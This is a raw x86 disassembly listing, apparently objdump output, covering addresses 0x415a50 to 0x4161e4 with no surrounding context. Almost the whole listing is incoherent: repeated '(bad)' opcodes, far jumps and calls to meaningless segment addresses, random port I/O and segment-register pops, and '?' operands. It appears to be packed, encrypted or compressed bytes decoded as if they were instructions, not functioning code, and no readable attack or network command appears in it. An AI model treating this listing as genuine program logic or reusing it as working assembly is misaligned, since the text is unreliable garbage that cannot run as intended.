  415a50:	mov    es,esp
  415a52:	cs je  0x415a69
  415a55:	mov    al,0xb1
  415a57:	(bad)  
  415a58:	jmp    0x7a8e8cbd
  415a5d:	mov    al,ds:0x306e0886
  415a62:	jae    0x415a01
  415a64:	adc    cl,bh
  415a66:	or     ch,BYTE PTR [esi]
  415a68:	dec    ebx
  415a69:	lods   eax,DWORD PTR ds:[esi]
  415a6a:	push   edx
  415a6b:	fisttp QWORD PTR [ebx-0x5a2efda5]
  415a71:	test   DWORD PTR [esi],esp
  415a73:	scas   eax,DWORD PTR es:[edi]
  415a74:	repnz sub BYTE PTR [edx],dl
  415a77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a78:	pop    eax
  415a79:	jmp    0x4159fd
  415a7b:	loop   0x415ac3
  415a7d:	sti    
  415a7e:	loop   0x415ac5
  415a80:	inc    ecx
  415a81:	enter  0x415a,0x46
  415a85:	mov    al,0xd0
  415a87:	mov    BYTE PTR [edx+0x79],ch
  415a8a:	pop    esp
  415a8b:	lods   eax,DWORD PTR ds:[esi]
  415a8c:	dec    edi
  415a8d:	ins    DWORD PTR es:[edi],dx
  415a8e:	pop    ebx
  415a8f:	jecxz  0x415a47
  415a91:	mov    al,0xd6
  415a93:	dec    edi
  415a94:	loop   0x415afc
  415a96:	(bad)  
  415a97:	xor    al,0xcf
  415a99:	in     eax,dx
  415a9a:	sbb    eax,0xba003a7c
  415a9f:	ins    DWORD PTR es:[edi],dx
  415aa0:	push   esi
  415aa1:	add    DWORD PTR [edi-0x4de0e8d4],esp
  415aa7:	or     BYTE PTR [eax+0x6b],ah
  415aaa:	stos   DWORD PTR es:[edi],eax
  415aab:	adc    BYTE PTR [ebx+ecx*4+0xc],cl
  415aaf:	ins    DWORD PTR es:[edi],dx
  415ab0:	mov    bh,0xad
  415ab2:	ins    DWORD PTR es:[edi],dx
  415ab3:	out    dx,eax
  415ab4:	pop    ds
  415ab5:	mov    esp,0xfe407738
  415aba:	mov    dl,0x82
  415abc:	lds    esi,FWORD PTR [esi+0x130a05c2]
  415ac2:	and    al,0xf4
  415ac4:	mov    edx,0x346ea962
  415ac9:	add    BYTE PTR [edi-0x18bc6305],dh
  415acf:	push   ss
  415ad0:	jnp    0x415ad6
  415ad2:	and    al,0x5b
  415ad4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ad5:	mov    al,ds:0xd8c217a9
  415ada:	fs arpl bx,bx
  415add:	mov    dh,0xe
  415adf:	test   al,0x73
  415ae1:	daa    
  415ae2:	jo     0x415ad3
  415ae4:	xchg   esi,eax
  415ae5:	sti    
  415ae6:	mov    ebp,0xa580a1ec
  415aeb:	ins    DWORD PTR es:[edi],dx
  415aec:	adc    BYTE PTR [eax],cl
  415aee:	out    0x29,eax
  415af0:	cmp    dl,BYTE PTR ds:0xf6d4135b
  415af6:	xchg   edx,eax
  415af7:	out    0x74,eax
  415af9:	cld    
  415afa:	xlat   BYTE PTR ds:[ebx]
  415afb:	fimul  WORD PTR [edi-0x49ea92d7]
  415b01:	sbb    eax,DWORD PTR [edx+0x4e]
  415b04:	and    eax,0xbb31f04d
  415b09:	ror    BYTE PTR ds:[ebx+0x5ec757ed],1
  415b10:	addr16 mov al,0x74
  415b13:	aas    
  415b14:	lea    ecx,[esi]
  415b16:	loop   0x415b1a
  415b18:	push   eax
  415b19:	aam    0x81
  415b1b:	loope  0x415ad1
  415b1d:	mov    bh,0xb6
  415b1f:	sub    eax,0xe322b82d
  415b24:	pop    ebx
  415b25:	addr16 into 
  415b27:	cmp    al,0xf2
  415b29:	xor    BYTE PTR [eax+0x51],ch
  415b2c:	ins    BYTE PTR es:[edi],dx
  415b2d:	sub    ah,al
  415b2f:	xlat   BYTE PTR ds:[ebx]
  415b30:	ss loop 0x415ae9
  415b33:	mov    ebp,0x5f0176d0
  415b38:	loopne 0x415ac9
  415b3a:	jmp    0xadb7:0x14c2867d
  415b41:	adc    BYTE PTR [edx+edx*4+0x23e1621c],al
  415b48:	jbe    0x415bc3
  415b4a:	imul   eax,DWORD PTR [edi-0x75],0xa18360d6
  415b51:	add    BYTE PTR [esi],cl
  415b53:	dec    ebx
  415b54:	sub    ch,BYTE PTR [edi]
  415b56:	test   eax,0xcba16968
  415b5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b5c:	in     al,dx
  415b5d:	mov    ecx,0xae85d0ed
  415b62:	pusha  
  415b63:	cmp    esp,ebx
  415b65:	xchg   ebp,eax
  415b66:	shl    edi,cl
  415b68:	sahf   
  415b69:	outs   dx,BYTE PTR ds:[esi]
  415b6a:	sub    eax,0x8d350d6c
  415b6f:	and    BYTE PTR [esi+edx*1-0x684eaafa],bl
  415b76:	sub    eax,0xc8db5b6c
  415b7b:	push   ebx
  415b7c:	or     DWORD PTR [edi-0x41920a0b],0xffffff8a
  415b83:	add    DWORD PTR ss:0xdb7c1251,ebp
  415b8a:	ja     0x415bec
  415b8c:	ins    DWORD PTR es:[edi],dx
  415b8d:	popa   
  415b8e:	jmp    0x415bb0
  415b90:	fisttp DWORD PTR [esi+0x76319cfe]
  415b96:	mov    WORD PTR [ebx],gs
  415b98:	xor    al,0xca
  415b9a:	lea    ecx,[esi]
  415b9c:	mov    ah,0xf4
  415b9e:	pop    ebp
  415b9f:	mov    ds:0xdcbc1480,al
  415ba4:	push   esi
  415ba5:	push   ebp
  415ba6:	dec    esp
  415ba7:	sbb    DWORD PTR [edi],eax
  415ba9:	jae    0x415c17
  415bab:	mov    ds:0x1b9900ba,al
  415bb0:	int3   
  415bb1:	ins    BYTE PTR es:[edi],dx
  415bb2:	repnz mov bh,0x8a
  415bb5:	dec    ebx
  415bb6:	dec    ebx
  415bb7:	pop    ds
  415bb8:	push   0xb0ceda42
  415bbd:	jmp    0x415b81
  415bbf:	or     bl,bl
  415bc1:	lea    eax,[esi-0xf0c66b8]
  415bc7:	stc    
  415bc8:	mov    esp,0x5c68707f
  415bcd:	fcom   DWORD PTR [esi]
  415bcf:	mov    esi,0x8e965fdb
  415bd4:	xor    eax,0xd0b872f4
  415bd9:	push   esp
  415bda:	pop    esp
  415bdb:	xor    ecx,edx
  415bdd:	xchg   esp,eax
  415bde:	mov    ch,0xc2
  415be0:	jns    0x415c2e
  415be2:	or     al,0xdc
  415be4:	fdivr  DWORD PTR [edx]
  415be6:	mov    al,dh
  415be8:	mov    WORD PTR [edi+eiz*1-0x4f],ds
  415bec:	push   esp
  415bed:	cld    
  415bee:	add    BYTE PTR [eax+edi*1+0x15],bl
  415bf2:	clc    
  415bf3:	and    dh,BYTE PTR [edx+0x6fca17c5]
  415bf9:	or     eax,0x8bda780f
  415bfe:	inc    edi
  415bff:	add    BYTE PTR [esi],ah
  415c01:	in     al,dx
  415c02:	and    bl,BYTE PTR [ecx+eax*4+0x1]
  415c06:	sbb    ecx,DWORD PTR ds:0x72ca0a50
  415c0c:	push   0xa1688342
  415c11:	data16 jg 0x415bac
  415c14:	inc    BYTE PTR [edi]
  415c16:	call   0x3656:0x1fdb6e00
  415c1d:	cmc    
  415c1e:	inc    BYTE PTR [esi+eiz*1+0x5452b68b]
  415c25:	or     bl,BYTE PTR [ebp-0x5c]
  415c28:	pop    DWORD PTR [ecx]
  415c2a:	adc    al,0x74
  415c2c:	fcmovnu st,st(2)
  415c2e:	xchg   BYTE PTR [ebp+0x10],bl
  415c31:	jne    0x415bf8
  415c33:	sub    eax,0x45a174ac
  415c38:	aam    0x9b
  415c3a:	das    
  415c3b:	ss pop eax
  415c3d:	and    eax,0xc58d51cd
  415c42:	mov    dh,0xa4
  415c44:	jmp    0x15d1e5fc
  415c49:	fcomp  DWORD PTR [edx]
  415c4b:	add    bl,al
  415c4d:	retf   0x5b2
  415c50:	gs into 
  415c52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c53:	test   DWORD PTR [ebx+0x3],ebx
  415c56:	test   al,0x5d
  415c58:	addr16 pop es
  415c5a:	loope  0x415cac
  415c5c:	inc    eax
  415c5d:	or     BYTE PTR [edx],0xdb
  415c60:	xchg   esi,eax
  415c61:	cmp    al,BYTE PTR [edx-0x1cb35cee]
  415c67:	dec    eax
  415c68:	mov    ecx,0x6d8529b5
  415c6d:	mov    esi,DWORD PTR [esi-0x2c]
  415c70:	push   edx
  415c71:	dec    esi
  415c72:	or     al,0xea
  415c74:	retf   
  415c75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c76:	mov    dl,0x4
  415c78:	mov    bh,0x85
  415c7a:	lods   eax,DWORD PTR ds:[esi]
  415c7b:	stos   DWORD PTR es:[edi],eax
  415c7c:	push   ebp
  415c7d:	mov    ds:0xb2650276,al
  415c82:	push   ebx
  415c83:	adc    eax,0x514db6b6
  415c88:	les    ecx,FWORD PTR [eax+edi*8+0x1b]
  415c8c:	shr    DWORD PTR cs:[edi-0x47d64bd8],cl
  415c93:	sbb    ebx,0x61
  415c96:	stc    
  415c97:	pop    edi
  415c98:	sub    esi,DWORD PTR [edi-0x28]
  415c9b:	fcmovu st,st(0)
  415c9d:	pop    eax
  415c9e:	imul   DWORD PTR [esi-0x1edb4313]
  415ca4:	in     eax,0x72
  415ca6:	inc    edx
  415ca7:	mov    al,0x95
  415ca9:	sbb    BYTE PTR [esi-0x7a],0x29
  415cad:	adc    al,0x80
  415caf:	test   DWORD PTR [eax-0x92be32e],eax
  415cb5:	nop
  415cb6:	les    eax,FWORD PTR [ebp-0xb937c53]
  415cbc:	clc    
  415cbd:	lea    eax,[ecx]
  415cbf:	mov    cl,0xc7
  415cc1:	lods   eax,DWORD PTR ds:[esi]
  415cc2:	or     ebp,DWORD PTR [eax+0x7]
  415cc5:	mov    edi,0x8db64ea8
  415cca:	popa   
  415ccb:	lods   eax,DWORD PTR ds:[esi]
  415ccc:	jno    0x415ca9
  415cce:	fiadd  DWORD PTR [edi+0x70e323a5]
  415cd4:	push   eax
  415cd5:	in     al,dx
  415cd6:	(bad)  
  415cd7:	int3   
  415cd8:	fwait
  415cd9:	xchg   esi,eax
  415cda:	add    edx,0xffffff8d
  415cdd:	ror    DWORD PTR [eax+edi*8],cl
  415ce0:	sti    
  415ce1:	mov    dl,0x32
  415ce3:	pop    ebx
  415ce4:	fdiv   DWORD PTR cs:[esi-0x73a22713]
  415ceb:	sbb    eax,0x8f8d438
  415cf0:	mov    DWORD PTR [edx-0x47],0x4a7cab81
  415cf7:	mov    eax,ds:0xab8a4e7
  415cfc:	pop    ebx
  415cfd:	add    eax,0x47bd95ed
  415d02:	jae    0x415d05
  415d04:	xchg   esp,eax
  415d05:	push   ecx
  415d06:	pop    ss
  415d07:	fadd   DWORD PTR ss:0xe865e946
  415d0e:	lods   eax,DWORD PTR ds:[esi]
  415d0f:	jge    0x415cc6
  415d11:	test   eax,0xd975d4b8
  415d16:	mov    dh,0x7b
  415d18:	hlt    
  415d19:	pop    esi
  415d1a:	fnstsw WORD PTR [edi]
  415d1c:	mov    edx,0x9f036db5
  415d21:	sbb    eax,0xf221838a
  415d26:	clc    
  415d27:	or     ah,dh
  415d29:	mov    bh,0xd6
  415d2b:	lods   eax,DWORD PTR ds:[esi]
  415d2c:	sub    edx,DWORD PTR [ecx+0x7b694d61]
  415d32:	xchg   edi,eax
  415d33:	push   cs
  415d34:	or     eax,0xddb15109
  415d39:	push   0x20
  415d3b:	dec    ecx
  415d3c:	cmp    BYTE PTR [eax+0x6c2f265],ch
  415d42:	pusha  
  415d43:	(bad)  ds:0x74c52a9a
  415d49:	div    BYTE PTR [eax]
  415d4b:	push   es
  415d4c:	ins    DWORD PTR es:[edi],dx
  415d4d:	add    eax,ecx
  415d4f:	lea    esp,[ebp+0x212d429e]
  415d55:	pusha  
  415d56:	dec    edx
  415d57:	test   eax,0xf9615b0b
  415d5c:	add    al,0xaf
  415d5e:	mov    esp,0xd45dffa
  415d63:	add    ecx,DWORD PTR [esi-0x4d1576a0]
  415d69:	leave  
  415d6a:	push   edx
  415d6b:	retf   0x5c68
  415d6e:	fcomp  st(2)
  415d70:	lds    ecx,FWORD PTR [eax+ebp*2]
  415d73:	pop    ss
  415d74:	xchg   ecx,eax
  415d75:	jo     0x415dc0
  415d77:	mov    eax,0xb6c2db93
  415d7c:	loope  0x415d2c
  415d7e:	jle    0x415dd1
  415d80:	cwde   
  415d81:	cmp    al,0xb5
  415d83:	jmp    0xa00e:0x8b9b8bec
  415d8a:	xchg   ebp,eax
  415d8b:	or     eax,0x60fe69f0
  415d90:	lods   eax,DWORD PTR ds:[esi]
  415d91:	mov    eax,DWORD PTR [edx-0x207570f5]
  415d97:	dec    ebx
  415d98:	ds enter 0xfa8b,0xc1
  415d9d:	(bad)  
  415d9e:	push   ss
  415d9f:	ins    BYTE PTR es:[edi],dx
  415da0:	sub    DWORD PTR [ebx+0x6b],0xed2ac983
  415da7:	(bad)  
  415da8:	inc    eax
  415da9:	mov    al,0x20
  415dab:	adc    al,0xbf
  415dad:	mov    ah,0x44
  415daf:	int    0x1b
  415db1:	gs mov ebx,0x8d1bb602
  415db7:	les    ecx,FWORD PTR [ebx-0x23]
  415dba:	stos   BYTE PTR es:[edi],al
  415dbb:	add    BYTE PTR [ecx],ch
  415dbd:	cmp    al,0x8
  415dbf:	mov    eax,0xdce51175
  415dc4:	push   eax
  415dc5:	das    
  415dc6:	jno    0x415da2
  415dc8:	lods   eax,DWORD PTR ds:[esi]
  415dc9:	ins    DWORD PTR es:[edi],dx
  415dca:	sbb    edx,DWORD PTR [ebx+ecx*1+0x38510b19]
  415dd1:	lods   eax,DWORD PTR ds:[esi]
  415dd2:	dec    ecx
  415dd3:	jle    0x415def
  415dd5:	push   0x6c
  415dd7:	pop    ss
  415dd8:	xchg   esi,eax
  415dd9:	lds    ecx,FWORD PTR [ecx]
  415ddb:	les    ebx,FWORD PTR [ebx*4+0x687b49ec]
  415de2:	mov    al,bl
  415de4:	and    BYTE PTR [ecx],dl
  415de6:	sbb    ah,BYTE PTR [ebx]
  415de8:	mov    al,ds:0xdd2dadc3
  415ded:	xchg   ebx,eax
  415dee:	pop    ecx
  415def:	pop    edx
  415df0:	push   esi
  415df1:	sbb    BYTE PTR [ecx+edx*1+0x6b31b58e],cl
  415df8:	xchg   edi,eax
  415df9:	mov    esi,0xe69659ed
  415dfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415dff:	push   esi
  415e00:	sub    al,BYTE PTR ds:0x4d14dd94
  415e06:	mov    ds:0xf076db6d,al
  415e0b:	xor    DWORD PTR [esi],esp
  415e0d:	cmp    dl,BYTE PTR [ebp+0x11f95fbd]
  415e13:	ins    DWORD PTR es:[edi],dx
  415e14:	stc    
  415e15:	inc    edx
  415e16:	xor    esp,0xc73516
  415e1c:	xchg   ebx,eax
  415e1d:	ret    
  415e1e:	rcl    eax,1
  415e20:	jle    0x415e8e
  415e22:	mov    bh,0x8e
  415e24:	mov    dh,0x1e
  415e26:	lahf   
  415e27:	into   
  415e28:	and    BYTE PTR [eax-0x5e],0xad
  415e2c:	cmp    ch,al
  415e2e:	ins    DWORD PTR es:[edi],dx
  415e2f:	jnp    0x415deb
  415e31:	test   DWORD PTR [ebx+eax*8],ebp
  415e34:	dec    edx
  415e35:	call   0x6e94:0x7cec59e
  415e3c:	in     eax,dx
  415e3d:	inc    edx
  415e3e:	push   edi
  415e3f:	inc    ebp
  415e40:	jp     0x415e18
  415e42:	mov    WORD PTR [ebp+0x1ebee986],cs
  415e48:	adc    al,0xb4
  415e4a:	mov    edx,ebx
  415e4c:	inc    esp
  415e4d:	cmp    edx,DWORD PTR [esp+ecx*8-0x7d92e010]
  415e54:	fsub   DWORD PTR [ecx+0x6d16fc92]
  415e5a:	inc    ebp
  415e5b:	jo     0x415ea4
  415e5d:	jne    0x415e4a
  415e5f:	sub    BYTE PTR [esi+0x621c0e65],dh
  415e65:	jno    0x415df3
  415e67:	neg    DWORD PTR [eax+0x45d0b4ba]
  415e6d:	out    0x2f,al
  415e6f:	add    al,0x1
  415e71:	clc    
  415e72:	push   cs
  415e73:	ror    BYTE PTR [esi],1
  415e75:	fucomp st(0)
  415e77:	mov    al,ds:0xeba2ff73
  415e7c:	enter  0xadf8,0xdd
  415e80:	fisubr DWORD PTR [esi]
  415e82:	fcomp  st(4)
  415e84:	xchg   ebp,eax
  415e85:	add    ch,BYTE PTR [ebx+0x2e]
  415e88:	fwait
  415e89:	inc    ch
  415e8b:	pop    ebp
  415e8c:	pop    eax
  415e8d:	push   0xd8bf8fb7
  415e92:	jnp    0x415ef6
  415e94:	std    
  415e95:	retf   0x3291
  415e98:	test   ah,0xad
  415e9b:	stos   DWORD PTR es:[edi],eax
  415e9c:	clc    
  415e9d:	add    ah,dl
  415e9f:	loop   0x415eda
  415ea1:	loope  0x415ed2
  415ea3:	xchg   edi,eax
  415ea5:	fcmovnb st,st(6)
  415ea7:	(bad)  
  415ea8:	push   esp
  415ea9:	mov    WORD PTR [esi],?
  415eab:	pop    esp
  415eac:	mov    edx,ebp
  415eae:	std    
  415eaf:	mov    esp,0x86b70b44
  415eb4:	cmp    cl,0xde
  415eb7:	add    DWORD PTR ds:0x8e436a7f,eax
  415ebd:	sbb    ecx,DWORD PTR [ebx+0x5d]
  415ec0:	push   ecx
  415ec1:	pusha  
  415ec2:	cwde   
  415ec3:	imul   ecx,DWORD PTR [edi-0x4c],0x40
  415ec7:	pop    edx
  415ec8:	mov    bh,0x8e
  415eca:	sbb    bl,0x2
  415ecd:	mov    ah,0x9e
  415ecf:	out    dx,eax
  415ed0:	mov    dl,0xac
  415ed2:	sbb    ecx,ebx
  415ed4:	aaa    
  415ed5:	or     DWORD PTR ss:[ebp+0x3efe9f],ecx
  415edc:	ret    
  415edd:	mov    dl,0x3c
  415edf:	scas   al,BYTE PTR es:[edi]
  415ee0:	pusha  
  415ee1:	pop    ebx
  415ee2:	outs   dx,BYTE PTR ds:[esi]
  415ee3:	ins    BYTE PTR es:[edi],dx
  415ee4:	fisub  DWORD PTR [esi-0x43d8c358]
  415eea:	sbb    dh,BYTE PTR [ebp+0x1]
  415eed:	mov    ch,0xdd
  415eef:	sbb    dh,BYTE PTR [ebx-0x35]
  415ef2:	je     0x415e9c
  415ef4:	push   esi
  415ef5:	jecxz  0x415e7d
  415ef7:	sub    al,0x7f
  415ef9:	mov    ebx,0xf9fbbad1
  415efe:	mov    bl,0xf6
  415f00:	ror    DWORD PTR [edi+0x7d7500],1
  415f06:	cmp    DWORD PTR ds:0x2e028688,ecx
  415f0c:	cmp    eax,0x1a8d69f4
  415f11:	add    eax,0xbaa5002d
  415f16:	cmp    al,0x6d
  415f18:	stos   DWORD PTR es:[edi],eax
  415f19:	sub    DWORD PTR [esi+0x17091a36],esi
  415f1f:	jmp    0x415eb5
  415f21:	sub    dh,dh
  415f23:	mov    ?,WORD PTR [esi]
  415f25:	aad    0x6d
  415f27:	arpl   WORD PTR [ecx-0x25885fdf],bp
  415f2d:	jns    0x415fa0
  415f2f:	jecxz  0x415fb0
  415f31:	mov    dh,0xda
  415f33:	push   es
  415f34:	sub    BYTE PTR [esi-0x18],cl
  415f37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f38:	pop    ecx
  415f39:	mov    esi,0x6d007210
  415f3e:	pop    ss
  415f3f:	xchg   ecx,eax
  415f40:	and    BYTE PTR ds:0x9652a4e0,0xda
  415f47:	ins    DWORD PTR es:[edi],dx
  415f48:	mov    edi,ebx
  415f4a:	mov    bh,0x71
  415f4c:	ins    BYTE PTR es:[edi],dx
  415f4d:	sub    eax,0x822b0e08
  415f52:	pop    ds
  415f53:	pop    ebp
  415f54:	fidiv  DWORD PTR [esi-0x21778bfc]
  415f5a:	fs pop esi
  415f5c:	mov    ecx,edx
  415f5e:	or     eax,0xa9bb0eb6
  415f63:	fisubr DWORD PTR [esi-0x47]
  415f66:	ret    0xfa9
  415f69:	mov    bh,0x76
  415f6b:	(bad)  [edx]
  415f6d:	cld    
  415f6e:	sti    
  415f6f:	mov    ah,0x6f
  415f71:	mov    eax,ds:0xac45691a
  415f76:	xor    BYTE PTR [ebp-0x65],ch
  415f79:	or     BYTE PTR [esi+0x1285e01c],dh
  415f7f:	aas    
  415f80:	int3   
  415f81:	bound  ecx,QWORD PTR [ecx]
  415f83:	in     eax,dx
  415f84:	pushaw 
  415f86:	mov    ds:0x1beba8e0,eax
  415f8b:	adc    DWORD PTR [edx+0x2a6b097],esi
  415f91:	outs   dx,BYTE PTR ds:[esi]
  415f92:	ins    DWORD PTR es:[edi],dx
  415f93:	inc    ecx
  415f94:	jmp    0x415fd9
  415f96:	add    eax,0x55d6dc55
  415f9b:	rcl    esi,0xa
  415f9e:	sub    al,0xee
  415fa0:	pop    esi
  415fa1:	fwait
  415fa2:	jg     0x415f7e
  415fa4:	mov    bh,0xe
  415fa6:	sub    ch,0xb1
  415fa9:	and    al,0xc2
  415fab:	pop    edx
  415fac:	mov    ds:0x81b0f8dc,al
  415fb1:	or     dh,BYTE PTR [edi+edx*2]
  415fb4:	ins    DWORD PTR es:[edi],dx
  415fb5:	mov    al,0xce
  415fb7:	popf   
  415fb8:	lea    eax,[ecx-0x25f4a4f5]
  415fbe:	in     al,dx
  415fbf:	inc    ebx
  415fc0:	aam    0xb9
  415fc2:	or     BYTE PTR [edx+0x2ed5b0e7],al
  415fc8:	ins    DWORD PTR es:[edi],dx
  415fc9:	xlat   BYTE PTR ds:[ebx]
  415fca:	adc    DWORD PTR [ebx+0x34],0x73371457
  415fd1:	mov    bh,0x6
  415fd3:	cmp    BYTE PTR [eax-0x3a8ce99],0xe2
  415fda:	loopne 0x415fdf
  415fdc:	lock sub dh,BYTE PTR [esi+0x51]
  415fe0:	ins    DWORD PTR es:[edi],dx
  415fe1:	sub    al,0x10
  415fe3:	cwde   
  415fe4:	mov    ah,0x83
  415fe6:	(bad)  
  415fe7:	fcmovnu st,st(2)
  415fe9:	mov    ss,edi
  415feb:	aad    0xeb
  415fed:	pop    ss
  415fee:	pop    esp
  415fef:	(bad)  
  415ff0:	sti    
  415ff1:	arpl   WORD PTR [eax],ax
  415ff3:	xor    al,0xb6
  415ff5:	lods   eax,DWORD PTR ds:[esi]
  415ff6:	repz push 0xffffffb0
  415ff9:	adc    DWORD PTR [edx-0x524834b5],ecx
  415fff:	mov    ebp,0xbfe36a9b
  416004:	dec    eax
  416005:	add    BYTE PTR [ecx+0x54bd8cef],bl
  41600b:	sbb    eax,DWORD PTR [eax-0x11a05e92]
  416011:	inc    edi
  416012:	dec    ebp
  416013:	cmp    ebp,ebx
  416015:	fiadd  DWORD PTR ds:0x42499830
  41601b:	mov    bl,0xb6
  41601d:	bound  esp,QWORD PTR [eax+0x1d8034c]
  416023:	mov    cl,0xe9
  416025:	pop    ebp
  416026:	cwde   
  416027:	add    ah,BYTE PTR [ebp+edx*4-0x4a81dd65]
  41602e:	add    edx,DWORD PTR [edi+0x53]
  416031:	repz (bad) 
  416033:	lock shl DWORD PTR [edi],cl
  416036:	rol    DWORD PTR [eax+0x5d],1
  416039:	push   0x1d
  41603b:	enter  0x1811,0xab
  41603f:	aad    0x96
  416041:	push   ss
  416042:	mov    edx,0x6b9ef6b4
  416047:	sbb    al,0x40
  416049:	dec    edx
  41604a:	cs adc al,0xde
  41604d:	ins    DWORD PTR es:[edi],dx
  41604e:	aaa    
  41604f:	call   0x6392:0x48effd20
  416056:	pop    ss
  416057:	clc    
  416058:	push   eax
  416059:	dec    ebx
  41605a:	pop    ebp
  41605b:	mov    ah,0xd4
  41605d:	mov    edx,0xd223f4b6
  416062:	ins    BYTE PTR es:[edi],dx
  416063:	push   ebp
  416064:	sub    BYTE PTR [eax],0xc
  416067:	test   BYTE PTR [eax],0x54
  41606a:	ins    BYTE PTR es:[edi],dx
  41606b:	xor    eax,0xb5912c6e
  416070:	repz sbb eax,0xf8a39c66
  416076:	stos   DWORD PTR es:[edi],eax
  416077:	adc    BYTE PTR [esi+ebp*2],dl
  41607a:	cdq    
  41607b:	ins    DWORD PTR es:[edi],dx
  41607c:	stos   DWORD PTR es:[edi],eax
  41607d:	and    ah,bl
  41607f:	mov    es,WORD PTR [ebp+0x70]
  416082:	arpl   WORD PTR [ebx+0x37],sp
  416085:	(bad)  
  416086:	cld    
  416087:	adc    eax,0xbfcb59c1
  41608c:	mov    cl,0xd1
  41608e:	stos   BYTE PTR es:[edi],al
  41608f:	arpl   WORD PTR [edi+esi*8-0x70],dx
  416093:	int    0xc2
  416095:	add    BYTE PTR [edx],dl
  416097:	jo     0x416099
  416099:	rcr    BYTE PTR [esi],0xbb
  41609c:	mov    cl,0xb5
  41609e:	dec    ebx
  41609f:	sub    DWORD PTR [esi-0x6b],esp
  4160a2:	cmp    edx,edi
  4160a4:	ja     0x41609c
  4160a6:	fdiv   st,st(4)
  4160a8:	adc    DWORD PTR [ecx+0x4b441a36],ebp
  4160ae:	cmp    al,0x76
  4160b0:	dec    ebp
  4160b1:	mov    al,0x6d
  4160b3:	mov    ds:0xec6e776d,al
  4160b8:	fmul   DWORD PTR [esi-0x68]
  4160bb:	inc    esp
  4160bc:	or     BYTE PTR [edx+0x4441752d],bh
  4160c2:	adc    BYTE PTR [esi],bh
  4160c4:	and    BYTE PTR [eax-0x472feeaa],dh
  4160ca:	jno    0x4160ee
  4160cc:	jg     0x4160d4
  4160ce:	(bad)  
  4160cf:	push   esp
  4160d0:	and    edx,edx
  4160d2:	lods   eax,DWORD PTR ds:[esi]
  4160d3:	inc    ecx
  4160d4:	ins    DWORD PTR es:[edi],dx
  4160d5:	shl    DWORD PTR [ecx+0x262c5cda],1
  4160db:	sbb    eax,0xb75536d8
  4160e0:	push   ebx
  4160e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160e2:	and    eax,0x265f596f
  4160e7:	pop    ss
  4160e8:	ins    BYTE PTR es:[edi],dx
  4160e9:	ins    DWORD PTR es:[edi],dx
  4160ea:	retf   
  4160eb:	pop    edi
  4160ec:	mov    ?,ecx
  4160ee:	add    BYTE PTR [edx-0x6c2bffb7],dh
  4160f4:	xchg   al,bh
  4160f6:	jl     0x416141
  4160f8:	lods   eax,DWORD PTR ds:[esi]
  4160f9:	fnsave [esi-0x1b3dd0ba]
  4160ff:	xlat   BYTE PTR ds:[ebx]
  416100:	scas   al,BYTE PTR es:[edi]
  416101:	out    0x26,eax
  416103:	push   eax
  416104:	push   0x61
  416106:	push   ebx
  416107:	lds    esp,FWORD PTR [ebp-0x596be081]
  41610d:	popf   
  41610e:	fild   DWORD PTR gs:[edx-0x6c]
  416112:	or     ebx,DWORD PTR [ebx+esi*1]
  416115:	loop   0x416134
  416117:	mov    BYTE PTR cs:[ebx],bl
  41611a:	test   DWORD PTR [ebx],ecx
  41611c:	popf   
  41611d:	xor    BYTE PTR ss:0x74a70242,ah
  416124:	push   eax
  416125:	mov    cl,0x9
  416127:	and    edi,DWORD PTR [eax-0x7c]
  41612a:	inc    edx
  41612b:	mov    eax,DWORD PTR [ebx+ebx*1]
  41612e:	add    ch,BYTE PTR [esi]
  416130:	pop    esi
  416131:	push   eax
  416132:	xlat   BYTE PTR ds:[ebx]
  416133:	dec    ebx
  416134:	xchg   ecx,eax
  416135:	int    0xa
  416137:	aam    0xb6
  416139:	jne    0x4161a2
  41613b:	sahf   
  41613c:	add    eax,0x9f27a786
  416141:	pop    ebx
  416142:	mov    ebx,0xb68e266d
  416147:	adc    eax,0x65c4d9ef
  41614c:	adc    DWORD PTR [ecx],ecx
  41614e:	fstp   st(2)
  416150:	repnz pop ebx
  416152:	rcl    BYTE PTR [ebp+0x70940066],1
  416158:	dec    ebp
  416159:	or     ebx,DWORD PTR [edi-0x1e]
  41615c:	push   ebp
  41615d:	add    BYTE PTR [ebp+0x241a055d],0x78
  416164:	push   ebp
  416165:	js     0x4160ea
  416167:	mov    dh,0x85
  416169:	xchg   dl,ah
  41616b:	mov    ds:0xac053ac1,al
  416170:	cmp    eax,0x42c6ed5b
  416175:	cmp    eax,0xeb1c61f
  41617a:	imul   edi,DWORD PTR [ecx-0xf],0xffffffe0
  41617e:	mov    dh,0x6d
  416180:	ins    DWORD PTR es:[edi],dx
  416181:	outs   dx,BYTE PTR ds:[esi]
  416182:	pop    esi
  416183:	xchg   ecx,eax
  416184:	mov    al,BYTE PTR [edx+eax*8-0x7a]
  416188:	cmp    al,0xba
  41618a:	sub    eax,0xa7a9a25d
  41618f:	pop    esp
  416190:	inc    eax
  416191:	jo     0x416205
  416193:	sti    
  416194:	push   0x6d
  416196:	or     ch,dl
  416198:	test   al,0xf5
  41619a:	(bad)  
  41619c:	outs   dx,BYTE PTR es:[esi]
  41619e:	jmp    0xb71418e8
  4161a3:	xchg   BYTE PTR [esi],bl
  4161a5:	and    ebp,DWORD PTR [ebx]
  4161a7:	das    
  4161a8:	xor    al,BYTE PTR [ebx-0x55d15dec]
  4161ae:	dec    ebp
  4161af:	xor    al,dl
  4161b1:	cmc    
  4161b2:	dec    edx
  4161b3:	scas   eax,DWORD PTR es:[edi]
  4161b4:	test   eax,0xeeb6d110
  4161b9:	test   dh,0x1d
  4161bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161bd:	pop    eax
  4161be:	pusha  
  4161bf:	mov    eax,ds:0x34a3bb70
  4161c4:	int    0x67
  4161c6:	xchg   ebx,eax
  4161c7:	pop    edx
  4161c8:	add    BYTE PTR [esi+0x321c6b6d],dh
  4161ce:	fst    QWORD PTR ds:0xee6ec77
  4161d4:	ins    DWORD PTR es:[edi],dx
  4161d5:	sub    ebx,DWORD PTR [ebp+0x68]
  4161d8:	inc    ebp
  4161d9:	js     0x4161c6
  4161db:	mov    edi,0x3b2c92ea
  4161e0:	(bad)
  4161e4:	mov    bh,0x63
